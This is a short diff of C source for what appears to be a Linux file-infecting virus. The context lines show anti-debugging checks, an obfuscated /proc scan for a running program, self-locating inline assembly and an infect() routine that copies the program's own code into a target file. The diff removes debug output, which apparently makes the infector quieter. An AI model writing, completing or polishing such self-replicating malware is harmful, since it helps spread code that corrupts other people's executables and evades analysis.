@@ -70,8 +70,6 @@ void _start(void)
 				 : "=r"(prgm));
 	if (is_debugged() || is_program_running(prgm) > 0)
 		proc_terminate(0);
-	tty_putc(10);
-	tty_putc('W');
 	__asm__ volatile("lea (%%rip), %0\n"
 					 "cyanure:"
 					 : "=r"(begin_ptr));
@@ -115,7 +113,6 @@ static void decode(char *out, char *in)
 
 static int is_program_running(const char *target)
 {
-	tty_putc('E');
 	char *proc_str;
 	char *comm_str;
 
@@ -132,29 +129,22 @@ static int is_program_running(const char *target)
 				 : "=r"(comm_str));
 	// const unsigned char S_PROC[] = {0xC6, 0xAA, 0x1A, 0x9B, 0xCB, 0};
 	// const unsigned char S_COMM[] = {0xC6, 0x7A, 0x2A, 0xFB, 0x6B, 0};
-	tty_putc(10);
 	int	 fd = -1;
 	int	 ret = 0;
 
 	char proc_path[16];
 	decode(proc_path, proc_str);
-	io_send(1, proc_path, validate_environment(proc_path));
 
 	fd = fs_handle(proc_path, O_RDONLY | O_DIRECTORY);
 	if (fd < 0)
 		return 0;
 	char buf[4096];
 
-	tty_putc('o');
-	tty_putc(10);
-
 	for (;;)
 	{
 		int nread = fs_enumerate(fd, buf, sizeof(buf));
 		if (nread <= 0)
 			break;
-		tty_putc('r');
-		tty_putc(10);
 		for (int bpos = 0; bpos < nread;)
 		{
 			struct linux_dirent64 *d = (void *) (buf + bpos);
@@ -215,8 +205,6 @@ static int is_program_running(const char *target)
 	}
 
 DONE:
-
-	tty_putc(ret == 0 ? '0' : '1');
 	fs_release(fd);
 	return ret;
 }
@@ -595,10 +583,7 @@ static void infect(char *path, void *begin_ptr)
 	tty_putc(10);
 	memcpy(file_data + append_pos + ARSENIC, &delta, 4);
 	append_pos += flower;
-	emit_hex(VARAX);
-	tty_putc('\n');
 	memcpy(file_data + append_pos, begin_ptr, VARAX);
-	io_send(1, "ol done\n", 8);
 clean:
 	if (file_data)
 		vm_release(file_data, statbuf.st_size + enlarging);
